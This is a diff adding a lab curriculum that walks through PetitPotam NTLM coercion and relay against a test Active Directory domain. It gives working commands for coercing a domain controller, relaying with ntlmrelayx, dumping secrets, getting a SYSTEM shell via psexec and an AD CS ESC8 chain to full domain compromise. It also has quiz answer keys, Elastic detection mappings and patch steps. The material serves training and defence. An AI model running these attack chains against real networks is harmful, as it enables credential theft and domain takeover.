@@ -269,4 +269,327 @@ cost:
   cpu_pct: 0
   detectability: medium
 
+curriculum:
+  title: "PetitPotam — Coerce a DC, relay to a member server, own the box"
+  summary: >
+    Guided walkthrough of CVE-2021-36942 against the testlab.local domain.
+    You will trigger MS-EFSRPC coercion against tldc01 from a low-priv
+    foothold, relay the coerced machine-account NTLM authentication to
+    tlms01 (a member server with SMB signing disabled), and pop a SYSTEM
+    shell as the DC machine account on the relay target. Final step
+    chains to ESC8 if AD CS is in play. Walks the Elastic detection
+    coverage for each leg.
+  learning_objectives:
+    - "Explain the MS-EFSRPC coercion primitive and which RPC opnums Microsoft has patched (EfsRpcOpenFileRaw, EfsRpcDecryptFileSrv, ...) vs left exposed."
+    - "Run topotam/PetitPotam and dirkjanm/PetitPotam.py and read which calls each tool fires."
+    - "Configure impacket-ntlmrelayx to receive a coerced auth and relay it to SMB on a different host."
+    - "Distinguish the SMB-relay path (tlms01) from the HTTP-relay-to-ADCS-Web-Enrollment path (ESC8)."
+    - "Identify which Elastic rule fires on the relay receiver vs the coercion source."
+  prerequisites:
+    - "Beacon on tlws01 as TESTLAB\\jdoe (or SOCKS proxy from Kali into the lab subnet)"
+    - "Kali 192.168.1.100 with Impacket >= 0.12 (impacket-ntlmrelayx, impacket-secretsdump)"
+    - "tlms01 (10.99.50.11) must have SMB signing OFF — pair with the smb-signing bolt-on"
+    - "tldc01 (10.99.50.10) must have the petitpotam bolt-on INSTALLED (mitigation reverted)"
+  estimated_total_minutes: 45
+  steps:
+    - id: "01-confirm-coercion-surface"
+      title: "Confirm EFSRPC named pipe is exposed on tldc01"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Verify the EFSRPC interface is reachable
+
+        Microsoft's August 2021 patch added EFSRPC to
+        `RestrictReceiveAuthenticationPackages` and set channel binding
+        enforcement on receivers. The bolt-on's install step clears both,
+        which re-exposes the unauthenticated `\PIPE\efsrpc` and
+        `\PIPE\lsarpc` named pipes for coercion.
+
+        From Kali (192.168.1.100), confirm the EFS service is reachable on
+        tldc01:
+
+        ```bash
+        rpcdump.py @10.99.50.10 2>/dev/null | grep -iE "efsr|efsrpc|c681d488"
+        # Expected:
+        # Protocol: [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol
+        # Binding: ncacn_np:10.99.50.10[\PIPE\lsarpc]
+        # UUID   : c681d488-d850-11d0-8c52-00c04fd90f7e v1.0
+        ```
+
+        Also verify the LSA mitigation is OFF (from any host that can hit
+        the DC's remote registry, or via SSM `AWS-RunPowerShellScript`):
+
+        ```powershell
+        # On tldc01 itself:
+        Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0' `
+          -Name RestrictReceiveAuthenticationPackages -ErrorAction SilentlyContinue
+        # Empty / null = vulnerable. A multistring containing "efsrpc" = patched.
+        ```
+
+        > **Detection callout** — The coercion *source* is silent; nothing
+        > on the DC fires until the relay receiver chains the auth.
+        > rpcdump is enumeration, not an alert trigger.
+    - id: "02-set-up-relay-listener"
+      title: "Start ntlmrelayx pointing at tlms01"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 2 — Stage the NTLM relay
+
+        ntlmrelayx is the catcher. We tell it to listen for incoming NTLM
+        authentications and forward each one to `smb://10.99.50.11` —
+        the member server tlms01. Because the smb-signing bolt-on is
+        installed on tlms01, the relayed session is accepted.
+
+        On Kali:
+
+        ```bash
+        impacket-ntlmrelayx \
+            -t smb://10.99.50.11 \
+            -smb2support \
+            --no-http-server \
+            --no-wcf-server \
+            -socks
+        ```
+
+        Flag breakdown (Impacket 0.12+):
+        - `-t smb://10.99.50.11` — relay target = tlms01 SMB
+        - `-smb2support` — SMB2 negotiation (required since 2008R2; default
+          since Impacket 0.10 but explicit for clarity)
+        - `--no-http-server`, `--no-wcf-server` — disable other listeners
+          (we want a clean SMB-only capture for this exercise)
+        - `-socks` — open a SOCKS proxy on tcp/1080 with the relayed
+          session as a usable identity for `proxychains` later
+
+        Expected boot output:
+
+        ```
+        [*] Protocol Client SMB loaded..
+        [*] Setting up SMB Server
+        [*] SOCKS proxy started on 0.0.0.0:1080
+        [*] Servers started, waiting for connections
+        ```
+
+        Leave this running in one tab.
+
+        > **Detection callout** — *Potential NTLM Relay Attack against a
+        > Computer Account* (`23e5407a-b696-4433-9297-087645f2726c`) fires
+        > when the relayed authentication lands at tlms01: a logon-type-3
+        > with a computer account ($) source from an unexpected IP.
+    - id: "03-trigger-coercion"
+      title: "Fire the coercion — three tool variants"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 3 — Coerce tldc01 to authenticate to Kali
+
+        Three current toolchains. They all call EFSRPC RPC opnums; the
+        difference is which opnum and which auth wrapper. All three send
+        the coerced auth to `192.168.1.100` (Kali / our ntlmrelayx).
+
+        ### Option A — topotam/PetitPotam (original C# port, classic)
+
+        ```bash
+        # Clone & build once:
+        # git clone https://github.com/topotam/PetitPotam
+        python3 PetitPotam.py 192.168.1.100 10.99.50.10
+        # Output:
+        # [-] Connecting to ncacn_np:10.99.50.10[\PIPE\lsarpc]
+        # [+] Connected!
+        # [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+        # [+] Successfully bound!
+        # [-] Sending EfsRpcOpenFileRaw!
+        # [+] Got expected ERROR_BAD_NETPATH exception!!
+        ```
+
+        `ERROR_BAD_NETPATH` is the SUCCESS signal — it means the DC
+        attempted to open `\\192.168.1.100\share\nonexistent`, which forced
+        NTLM authentication outbound. ntlmrelayx caught it.
+
+        ### Option B — dirkjanm/PetitPotam wrapper inside Impacket
+
+        ```bash
+        impacket-petitpotam -u jdoe -p 'Welcome1!' -d testlab.local \
+            192.168.1.100 10.99.50.10
+        ```
+
+        Same RPC primitive, authenticates as TESTLAB\jdoe first (some
+        patched-but-misconfigured DCs accept this where anonymous fails).
+
+        ### Option C — ly4k/Coercer (multi-method fuzzer)
+
+        ```bash
+        coercer coerce -u jdoe -p 'Welcome1!' -d testlab.local \
+            -l 192.168.1.100 -t 10.99.50.10 \
+            --filter-method-name EfsRpcOpenFileRaw
+        ```
+
+        Coercer cycles through EFSRPC opnums and reports which ones the
+        target accepts — useful when the patch is partial (Microsoft has
+        patched some opnums but left others exposed across 2022/2023
+        rollups).
+
+        ### Option D — CS BOF in-memory
+
+        From the tlws01 beacon:
+
+        ```
+        beacon> inline-execute /opt/bofs/petitpotam.x64.o \\10.99.50.10 192.168.1.100
+        ```
+
+        Same primitive, no process creation on tlws01.
+
+        Switch to the ntlmrelayx tab — you should see:
+
+        ```
+        [*] SMBD-Thread-5: Received connection from 10.99.50.10, attacking target smb://10.99.50.11
+        [*] Authenticating against smb://10.99.50.11 as TESTLAB/TLDC01$ SUCCEED
+        [*] SOCKS: Adding TESTLAB/TLDC01$@10.99.50.11(445) to active SOCKS connection. Enjoy
+        ```
+
+        TLDC01$ is now authenticated to tlms01 as a domain controller's
+        machine account — typically a member of Domain Computers but
+        sometimes used by GPO scripts with elevated rights.
+      assessment:
+        question: "Why does the EfsRpcOpenFileRaw call return ERROR_BAD_NETPATH on success?"
+        options:
+          - "The DC's EFS service is broken on patched hosts."
+          - "The RPC asks the DC to open \\\\<attacker_ip>\\share\\file — the share doesn't exist on the attacker, so the DC fails AFTER it has already attempted NTLM authentication to reach the share. The auth happens before the path lookup."
+          - "The error indicates the patch is partially applied."
+          - "It means the attacker IP is unreachable from the DC."
+        correct_index: 1
+        explanation: >
+          The Windows SMB client always authenticates BEFORE checking
+          whether the requested share exists. So the DC sends a Type-3
+          NTLM authentication message to the attacker (which ntlmrelayx
+          catches), then the attacker doesn't actually serve a share back
+          and the DC reports BAD_NETPATH. The auth has already been
+          relayed — the error is the *post-auth* failure.
+    - id: "04-exploit-relayed-session"
+      title: "Use the relayed TLDC01$ session against tlms01"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 4 — Cash out the relay
+
+        With ntlmrelayx's SOCKS proxy running and the TLDC01$ session
+        active, you have a domain-computer-account identity against tlms01.
+        Use proxychains to drive any Impacket tool through the relayed
+        session:
+
+        ```bash
+        # Edit /etc/proxychains4.conf — ensure last line is:
+        # socks4 127.0.0.1 1080
+
+        proxychains -q impacket-secretsdump -no-pass TESTLAB/TLDC01\$@10.99.50.11
+        # Pulls SAM + LSA + cached creds from tlms01 as DC-machine-account
+        ```
+
+        Or pop an interactive shell:
+
+        ```bash
+        proxychains -q impacket-psexec -no-pass TESTLAB/TLDC01\$@10.99.50.11
+        # NT AUTHORITY\SYSTEM@TLMS01 C:\Windows\system32>
+        ```
+
+        ### Side-quest: chain to AD CS ESC8 (the famous PetitPotam payoff)
+
+        If tldc01 also runs AD CS Web Enrollment on HTTP (the default for
+        the Enterprise CA role), the more devastating chain is:
+
+        ```bash
+        impacket-ntlmrelayx \
+            -t http://tldc01.testlab.local/certsrv/certfnsh.asp \
+            -smb2support \
+            --adcs --template DomainController
+        ```
+
+        Then re-fire the coercion. ntlmrelayx requests a DC certificate
+        on behalf of TLDC01$ from the CA. Once issued, the certificate
+        authenticates as the DC itself — full domain compromise via PKINIT:
+
+        ```bash
+        impacket-getTGT -cert-pem tldc01.crt -key-pem tldc01.key \
+            testlab.local/TLDC01\$
+        impacket-secretsdump -k -no-pass TESTLAB/TLDC01\$@tldc01.testlab.local
+        # NTDS.dit dump including krbtgt
+        ```
+
+        > **Detection callout** — *Potential Relay Attack against a Domain
+        > Controller* (`4682fd2c-cfae-47ed-a543-9bed37657aa6`) fires
+        > specifically on this HTTP-NTLM-to-/certsrv relay path. It's the
+        > highest-confidence indicator of an active PetitPotam->ESC8 chain.
+    - id: "05-detection-mapping"
+      title: "Walk the detection chain on tllinux01"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 5 — What the SOC sees in Kibana
+
+        Open Kibana on https://10.99.50.13:5601, switch to **Security →
+        Detections** and filter the past 30 minutes. After Steps 3 + 4
+        you should see:
+
+        | Phase | Rule | Source event | Host |
+        |---|---|---|---|
+        | Coercion source | (no rule — silent) | Sysmon EID 3, outbound 445 from tldc01 to 192.168.1.100 | tldc01 |
+        | Relay receiver  | Potential NTLM Relay Attack against a Computer Account | 4624 logon type 3, source IP 192.168.1.100, computer account TLDC01$ | tlms01 |
+        | Relay receiver  | Potential Computer Account NTLM Relay Activity | same 4624, correlated with subsequent SMB-tree-connect | tlms01 |
+        | ESC8 path       | Potential Relay Attack against a Domain Controller | 4768 (Kerberos AS-REQ via cert PKINIT) for TLDC01$ | tldc01 |
+        | Cash-out        | Potential DCSync Activity | 4662 DS-Replication-Get-Changes-All on tldc01 | tldc01 |
+
+        The single most reliable smoking gun is the
+        "computer-account-authenticating-from-attacker-IP" event on tlms01
+        — domain controllers should never log into member servers from a
+        non-DC IP.
+      assessment:
+        question: "If you only had budget to tune one Elastic rule for high-fidelity PetitPotam detection, which would it be and why?"
+        options:
+          - "Sysmon Event 3 outbound 445 — catches all SMB outbound."
+          - "Potential NTLM Relay Attack against a Computer Account — fires on the cross-host computer-account logon that has no legitimate equivalent."
+          - "Volume Shadow Copy Created via VssAdmin — coercion uses VSS."
+          - "Failed Logon 4625 with computer account source — too noisy."
+        correct_index: 1
+        explanation: >
+          DC machine accounts authenticating to member servers from an
+          arbitrary IP is essentially never legitimate (DCs talk to
+          members via well-known service accounts and Kerberos, not their
+          own machine identity). This rule has a near-zero false-positive
+          rate and catches every variant of PetitPotam regardless of which
+          RPC opnum is used or which tool fires it.
+    - id: "06-mitigation-and-patch"
+      title: "Apply the patch and verify the chain is broken"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 6 — Patch + re-test
+
+        Click the **Patch** action on this card. The patch:
+
+        1. Installs KB5005413 (Aug 2021 OOB rollup or current cumulative)
+        2. Re-adds `efsrpc` to
+           `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\RestrictReceiveAuthenticationPackages`
+        3. Sets `LdapEnforceChannelBinding = 2` on the DC
+        4. Sets `LmCompatibilityLevel = 5` (refuse LM + NTLMv1)
+
+        Re-run Step 3. Expected outcome:
+
+        ```
+        $ python3 PetitPotam.py 192.168.1.100 10.99.50.10
+        [-] Sending EfsRpcOpenFileRaw!
+        [-] Exception caught (rpc_s_access_denied)
+        ```
+
+        The DC now requires authentication on the EFSRPC interface, and the
+        relay path is blocked by Extended Protection for Authentication
+        even if you find an alternative coercion vector.
+
+        ### Deeper hardening (operator should know)
+
+        - Enable SMB signing on **every** Windows host (tlms01 must require
+          SMB signing — pair with the smb-signing bolt-on)
+        - On AD CS: enable EPA on the Web Enrollment IIS site (`appcmd set
+          config /section:windowsAuthentication /+"extendedProtection"`)
+        - Disable HTTP on /certsrv entirely; force HTTPS
+        - Remove "Enroll" from Domain Computers on any cert template that
+          allows Client Authentication
+
+        > **Rollback** — the bolt-on declares `patch_revert`, which un-does
+        > the LSA registry hardening. Use this to re-arm the lab between
+        > training runs.
+
 status: stable
